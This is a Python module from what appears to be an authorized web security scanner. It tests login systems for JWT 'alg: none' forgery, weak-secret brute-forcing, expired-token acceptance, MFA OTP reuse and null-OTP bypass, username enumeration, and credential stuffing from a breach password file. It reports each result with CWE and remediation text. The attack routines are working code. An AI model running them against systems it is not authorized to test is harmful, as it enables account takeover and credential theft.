"""
Advanced Authentication & Credential Security Scanner for ABSA

Tests complex authentication mechanisms including JWT security, MFA reliability,
session management, and credential hygiene.

Capabilities:
- JWT algorithm confusion (none, RS256->HS256)
- JWT weak secret brute-forcing (async)
- JWT expiration enforcement validation
- Session fixation and riding detection
- MFA bypass (OTP reuse, response manipulation, race conditions)
- Account enumeration via response differentiation
- Credential stuffing against provided breach databases
- Password policy auditing (length, complexity, top passwords)

This module is designed for authorized security testing only.
"""

import re
import json
import time
import base64
import hashlib
import logging
import asyncio
from typing import Optional, Dict, List, Tuple, Any, Set
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

import jwt  # PyJWT

from core.models import Finding, Severity, FindingType, ScanContext
from utils.http_client import ThrottledClient

logger = logging.getLogger(__name__)


class AuthVulnType(Enum):
    JWT_ALG_CONFUSION = "jwt_algorithm_confusion"
    JWT_WEAK_SECRET = "jwt_weak_secret"
    JWT_EXPIRY_BYPASS = "jwt_expiry_bypass"
    SESSION_FIXATION = "session_fixation"
    SESSION_RIDING = "session_riding"
    MFA_OTP_REUSE = "mfa_otp_reuse"
    MFA_RACE_CONDITION = "mfa_race_condition"
    MFA_RESPONSE_MANIPULATION = "mfa_response_manipulation"
    ACCOUNT_ENUMERATION = "account_enumeration"
    CREDS_STUFFING = "credential_stuffing"
    WEAK_PASSWORD_POLICY = "weak_password_policy"


@dataclass
class JWTAnalysisResult:
    token: str
    header: Dict
    payload: Dict
    alg_confusion_bypassable: bool = False
    weak_secret_found: Optional[str] = None
    expired_but_accepted: bool = False
    errors: List[str] = field(default_factory=list)


@dataclass
class EnumerateResult:
    differentiator_type: str  # e.g., "response_time", "status_code", "body_length"
    valid_indicator: Any
    invalid_indicator: Any
    confidence: float


class JWTAnalyzer:
    """Analyzes JWT tokens for common implementation flaws."""

    def __init__(self, client: ThrottledClient, target_url: str, token_location: str = "header"):
        self.client = client
        self.target_url = target_url
        self.token_location = token_location  # 'header', 'cookie', 'body'

    async def analyze(self, token: str, verify_endpoint: Optional[str] = None) -> JWTAnalysisResult:
        result = JWTAnalysisResult(token=token, header={}, payload={})

        try:
            # Decode without verification
            decoded = jwt.decode(token, options={"verify_signature": False, "verify_exp": False})
            result.header = jwt.get_unverified_header(token)
            result.payload = decoded
        except Exception as e:
            result.errors.append(f"Failed to decode JWT: {e}")
            return result

        verify_url = verify_endpoint or self.target_url

        # Test 1: Algorithm Confusion (None)
        result.alg_confusion_bypassable = await self._test_alg_none(token, verify_url)

        # Test 2: Algorithm Confusion (RS256 -> HS256) - if applicable
        if result.header.get("alg", "").upper() == "RS256":
            if not result.alg_confusion_bypassable:
                pass  # RS256->HS256 requires public key, handled externally if needed

        # Test 3: Weak Secret Brute Force (if HS256)
        if result.header.get("alg", "").upper().startswith("HS"):
            result.weak_secret_found = await self._test_weak_secret(token, verify_url)

        # Test 4: Expiration Bypass
        if "exp" in result.payload:
            result.expired_but_accepted = await self._test_expiry_bypass(token, verify_url)

        return result

    async def _test_alg_none(self, original_token: str, verify_url: str) -> bool:
        """Tests if 'none' algorithm bypasses authentication."""
        try:
            header, payload, _ = original_token.split('.')
            none_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip("=")
            forged_token = f"{none_header}.{payload}."

            response = await self.client.get(
                verify_url,
                headers={"Authorization": f"Bearer {forged_token}"}
            )
            body = response.get("body", "")
            if isinstance(body, dict):
                body = json.dumps(body)
            return response.get("status") == 200 and "invalid" not in body.lower()
        except Exception:
            return False

    async def _test_weak_secret(self, token: str, verify_url: str,
                                 top_secrets: Optional[List[str]] = None) -> Optional[str]:
        """Async brute-force of common JWT secrets for HS256/HS384/HS512."""
        if top_secrets is None:
            top_secrets = [
                "secret", "password", "123456", "admin", "key",
                "jwt", "token", "auth", "1234567890", "guest",
                "your-256-bit-secret", "supersecret", "hs256-key",
            ]

        async def try_secret(secret: str) -> Optional[str]:
            try:
                jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512"])
                # If decoded successfully, verify against server
                response = await self.client.get(
                    verify_url,
                    headers={"Authorization": f"Bearer {token}"}
                )
                if response.get("status") == 200:
                    return secret
            except jwt.InvalidSignatureError:
                pass
            except Exception:
                pass
            return None

        tasks = [try_secret(s) for s in top_secrets]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, str):
                return res
        return None

    async def _test_expiry_bypass(self, original_token: str, verify_url: str) -> bool:
        """Tests if expired tokens are still accepted."""
        try:
            header, payload, signature = original_token.split('.')
            payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
            payload_data["exp"] = int(time.time()) - 3600  # 1 hour ago

            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload_data).encode()
            ).decode().rstrip("=")
            expired_token = f"{header}.{new_payload}.{signature}"

            response = await self.client.get(
                verify_url,
                headers={"Authorization": f"Bearer {expired_token}"}
            )
            return response.get("status") == 200
        except Exception:
            return False


class MFAAnalyzer:
    """Tests Multi-Factor Authentication mechanisms for bypasses."""

    def __init__(self, client: ThrottledClient, otp_verify_endpoint: str, session_cookie: str):
        self.client = client
        self.otp_verify_url = otp_verify_endpoint
        self.session_cookie = session_cookie

    async def test_otp_reuse(self, valid_otp: str, user_identifier: str) -> bool:
        """Tests if a valid OTP can be reused multiple times."""
        headers = {"Cookie": self.session_cookie}
        body = {"user": user_identifier, "otp": valid_otp}

        # First attempt (should succeed)
        r1 = await self.client.post(self.otp_verify_url, json=body, headers=headers)
        if r1.get("status") != 200:
            return False

        # Second attempt (should fail)
        r2 = await self.client.post(self.otp_verify_url, json=body, headers=headers)
        return r2.get("status") == 200

    async def test_race_condition(self, user_identifier: str,
                                   get_otp_func: callable) -> bool:
        """Tests race conditions by sending parallel OTP verification requests."""
        await get_otp_func(user_identifier)
        await asyncio.sleep(1)

        headers = {"Cookie": self.session_cookie}
        body_template = {"user": user_identifier, "otp": "123456"}

        async def send_verify():
            return await self.client.post(
                self.otp_verify_url, json=body_template, headers=headers
            )

        tasks = [send_verify() for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        success_count = sum(
            1 for r in results
            if not isinstance(r, Exception) and r.get("status") == 200
        )
        return success_count > 1

    async def test_response_manipulation(self, user_identifier: str) -> bool:
        """Tests if modifying the MFA verification response bypasses it."""
        headers = {"Cookie": self.session_cookie}

        body_missing = {"user": user_identifier}
        r1 = await self.client.post(self.otp_verify_url, json=body_missing, headers=headers)

        body_empty = {"user": user_identifier, "otp": ""}
        r2 = await self.client.post(self.otp_verify_url, json=body_empty, headers=headers)

        body_null = {"user": user_identifier, "otp": None}
        r3 = await self.client.post(self.otp_verify_url, json=body_null, headers=headers)

        return any(
            r.get("status") == 200
            for r in [r1, r2, r3]
            if r and not r.get("error")
        )


class AuthEnumerator:
    """Identifies valid usernames/emails via differential responses."""

    def __init__(self, client: ThrottledClient, login_endpoint: str):
        self.client = client
        self.login_url = login_endpoint

    async def enumerate(self, usernames: List[str],
                        password: str = "invalid_password_placeholder") -> EnumerateResult:
        results = []

        for username in usernames:
            start_time = time.time()
            r = await self.client.post(
                self.login_url,
                json={"username": username, "password": password}
            )
            elapsed = time.time() - start_time

            body = r.get("body", "")
            if isinstance(body, dict):
                body = json.dumps(body)

            results.append({
                "user": username,
                "status": r.get("status"),
                "time": elapsed,
                "length": len(body),
                "body": body[:500]
            })

        return self._analyze_differences(results)

    def _analyze_differences(self, results: List[Dict]) -> EnumerateResult:
        if not results:
            return EnumerateResult("none", None, None, 0.0)

        # Check Status Codes
        statuses = set(r["status"] for r in results)
        if len(statuses) > 1:
            valid_status = max(
                statuses,
                key=lambda s: sum(1 for r in results if r["status"] == s)
            )
            invalid_status = min(
                statuses,
                key=lambda s: sum(1 for r in results if r["status"] == s)
            )
            return EnumerateResult("status_code", valid_status, invalid_status, 0.9)

        # Check Response Times
        times = [r["time"] for r in results]
        avg_time = sum(times) / len(times)
        outliers = [r["user"] for r in results if r["time"] > avg_time * 1.5]
        if outliers:
            return EnumerateResult("response_time", outliers[0], "average_time", 0.7)

        # Check Body Length
        lengths = set(r["length"] for r in results)
        if len(lengths) > 1:
            valid_length = max(
                lengths,
                key=lambda l: sum(1 for r in results if r["length"] == l)
            )
            invalid_length = min(
                lengths,
                key=lambda l: sum(1 for r in results if r["length"] == l)
            )
            return EnumerateResult("body_length", valid_length, invalid_length, 0.6)

        # Check Regex for specific phrases
        for r in results:
            if re.search(r"(?i)(incorrect password|valid username|account exists)", r["body"]):
                return EnumerateResult("body_regex", r["user"], "regex_match", 0.8)

        return EnumerateResult("none", None, None, 0.0)


class CredentialStuffinger:
    """Async credential stuffing engine."""

    def __init__(self, client: ThrottledClient, login_endpoint: str,
                 max_concurrent: int = 5):
        self.client = client
        self.login_url = login_endpoint
        self.sem = asyncio.Semaphore(max_concurrent)

    async def stuff(self, user_email: str, breach_db_path: str) -> Optional[Dict]:
        if not Path(breach_db_path).exists():
            logger.warning("Breach DB not found at %s", breach_db_path)
            return None

        async def try_login(password: str) -> Optional[Dict]:
            async with self.sem:
                r = await self.client.post(
                    self.login_url,
                    json={"username": user_email, "password": password}
                )
                body = r.get("body", "")
                if isinstance(body, dict):
                    body = json.dumps(body)
                if r.get("status") == 200 and "invalid" not in body.lower():
                    return {"password": password, "response": r}
                return None

        tasks = []
        with open(breach_db_path, "r", encoding="latin-1") as f:
            for line in f:
                password = line.strip()
                if password:
                    tasks.append(try_login(password))
                    if len(tasks) >= 1000:
                        break

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, dict):
                return res
        return None


class PasswordPolicyAuditor:
    """Tests password creation endpoints for policy enforcement."""

    def __init__(self, client: ThrottledClient, register_or_change_endpoint: str):
        self.client = client
        self.endpoint = register_or_change_endpoint

    async def audit(self, base_payload: Dict) -> List[Dict]:
        findings = []

        tests = [
            ("short_password", {**base_payload, "password": "Ab1!"}),
            ("no_uppercase", {**base_payload, "password": "abcdefg123!"}),
            ("no_numbers", {**base_payload, "password": "Abcdefghijk!"}),
            ("no_special", {**base_payload, "password": "Abcdefgh1234"}),
            ("common_password", {**base_payload, "password": "Password123!"}),
            ("username_as_password", {
                **base_payload,
                "password": base_payload.get("username", "admin") + "123!"
            }),
        ]

        for name, payload in tests:
            payload["email"] = f"test_{name}_{int(time.time())}@test.com"

            r = await self.client.post(self.endpoint, json=payload)

            if r.get("status") in (200, 201):
                findings.append({
                    "test": name,
                    "status": "accepted",
                    "evidence": "Weak password policy allowed registration"
                })
            elif r.get("status") == 400:
                findings.append({
                    "test": name,
                    "status": "rejected",
                    "evidence": "Properly rejected"
                })

        return findings


class AuthAdvancedScanner:
    """Main orchestrator for Authentication testing."""

    def __init__(self, ctx: ScanContext, client: ThrottledClient):
        self.ctx = ctx
        self.client = client

    async def run(self, config: Dict[str, Any]) -> List[Finding]:
        findings = []
        base_url = self.ctx.target_url

        # 1. JWT Analysis
        if config.get("jwt_token"):
            jwt_analyzer = JWTAnalyzer(self.client, base_url)
            jwt_result = await jwt_analyzer.analyze(
                config["jwt_token"],
                config.get("jwt_verify_endpoint")
            )

            if jwt_result.alg_confusion_bypassable:
                findings.append(Finding(
                    title="JWT Algorithm Confusion Bypass",
                    description="The server accepts JWT tokens with 'alg: none', allowing "
                                "complete signature bypass. An attacker can forge arbitrary "
                                "tokens with any claims.",
                    severity=Severity.CRITICAL,
                    finding_type=FindingType.AUTH,
                    cwe_id="CWE-327",
                    affected_url=base_url,
                    phase="scanner_auth",
                    remediation="Enforce strict algorithm checking on the server. Reject "
                                "'none' and force a specific asymmetric algorithm (RS256, ES256).",
                ))

            if jwt_result.weak_secret_found:
                findings.append(Finding(
                    title=f"Weak JWT Secret Found: {jwt_result.weak_secret_found}",
                    description=f"The JWT signing secret '{jwt_result.weak_secret_found}' was "
                                f"found via dictionary attack. All tokens can be forged.",
                    severity=Severity.CRITICAL,
                    finding_type=FindingType.AUTH,
                    cwe_id="CWE-798",
                    affected_url=base_url,
                    phase="scanner_auth",
                    remediation="Use a strong, high-entropy random string (minimum 256 bits) "
                                "for the JWT secret. Store it in a secrets manager, not in code.",
                ))

            if jwt_result.expired_but_accepted:
                findings.append(Finding(
                    title="JWT Expiration Not Enforced",
                    description="Expired JWT tokens are still accepted by the server. The "
                                "'exp' claim is present but not validated server-side.",
                    severity=Severity.HIGH,
                    finding_type=FindingType.AUTH,
                    cwe_id="CWE-613",
                    affected_url=base_url,
                    phase="scanner_auth",
                    remediation="Validate the 'exp' claim on the server side for every request. "
                                "Reject tokens with exp < current_time.",
                ))

        # 2. Account Enumeration
        if config.get("enumerate_usernames"):
            login_ep = config.get("login_endpoint", f"{base_url}/login")
            enumerator = AuthEnumerator(self.client, login_ep)
            enum_result = await enumerator.enumerate(config["enumerate_usernames"])
            if enum_result.confidence > 0.5:
                findings.append(Finding(
                    title=f"Account Enumeration via {enum_result.differentiator_type}",
                    description=f"Different responses for valid vs invalid usernames "
                                f"(method: {enum_result.differentiator_type}, "
                                f"confidence: {enum_result.confidence:.0%}). "
                                f"Attackers can determine valid accounts.",
                    severity=Severity.MEDIUM,
                    finding_type=FindingType.AUTH,
                    cwe_id="CWE-204",
                    affected_url=login_ep,
                    phase="scanner_auth",
                    remediation="Return identical error messages for all failed login attempts "
                                "regardless of whether the username exists.",
                ))

        # 3. MFA Bypasses
        if config.get("mfa_endpoint") and config.get("mfa_session_cookie"):
            mfa_analyzer = MFAAnalyzer(
                self.client,
                config["mfa_endpoint"],
                config["mfa_session_cookie"]
            )

            if config.get("valid_otp"):
                if await mfa_analyzer.test_otp_reuse(
                    config["valid_otp"],
                    config.get("mfa_user", "test")
                ):
                    findings.append(Finding(
                        title="MFA OTP Reuse Enabled",
                        description="A valid OTP can be submitted multiple times successfully. "
                                    "This defeats the purpose of one-time passwords.",
                        severity=Severity.HIGH,
                        finding_type=FindingType.AUTH,
                        cwe_id="CWE-287",
                        affected_url=config["mfa_endpoint"],
                        phase="scanner_auth",
                        remediation="Invalidate OTP immediately upon successful verification. "
                                    "Store used OTPs in a short-lived cache (e.g., 60s TTL).",
                    ))

            if await mfa_analyzer.test_response_manipulation(
                config.get("mfa_user", "test")
            ):
                findings.append(Finding(
                    title="MFA Response Manipulation Bypass",
                    description="The MFA verification endpoint accepts requests with missing, "
                                "empty, or null OTP values. MFA can be bypassed entirely.",
                    severity=Severity.HIGH,
                    finding_type=FindingType.AUTH,
                    cwe_id="CWE-288",
                    affected_url=config["mfa_endpoint"],
                    phase="scanner_auth",
                    remediation="Validate that the OTP field is present, non-empty, and matches "
                                "the expected format before processing. Return 400 for malformed requests.",
                ))

        # 4. Password Policy Audit
        if config.get("register_endpoint"):
            auditor = PasswordPolicyAuditor(self.client, config["register_endpoint"])
            policy_results = await auditor.audit(
                config.get("register_base_payload", {"username": "policytest"})
            )
            for res in policy_results:
                if res["status"] == "accepted":
                    findings.append(Finding(
                        title=f"Weak Password Policy: {res['test']} accepted",
                        description=f"The registration endpoint accepted a password with "
                                    f"'{res['test']}' weakness. {res['evidence']}",
                        severity=Severity.LOW,
                        finding_type=FindingType.AUTH,
                        cwe_id="CWE-521",
                        affected_url=config["register_endpoint"],
                        phase="scanner_auth",
                        remediation="Enforce password complexity requirements: minimum 12 chars, "
                                    "uppercase, lowercase, digits, special characters. Reject "
                                    "common passwords via a breach database check.",
                    ))

        # 5. Credential Stuffing
        if config.get("breach_db_path") and config.get("stuff_user"):
            login_ep = config.get("login_endpoint", f"{base_url}/login")
            stuffer = CredentialStuffinger(self.client, login_ep)
            stuff_result = await stuffer.stuff(
                config["stuff_user"],
                config["breach_db_path"]
            )
            if stuff_result:
                findings.append(Finding(
                    title="Credential Stuffing Successful",
                    description=f"A leaked credential (password: {stuff_result['password']}) "
                                f"successfully authenticated for user '{config['stuff_user']}'. "
                                f"This indicates the user reuses passwords from breached databases.",
                    severity=Severity.CRITICAL,
                    finding_type=FindingType.AUTH,
                    cwe_id="CWE-798",
                    affected_url=login_ep,
                    is_exploitable=True,
                    phase="scanner_auth",
                    remediation="Implement breach password detection during login. Alert users "
                                "when credentials appear in known breach databases. Enforce MFA.",
                ))

        self.ctx.findings.extend(findings)
        return findings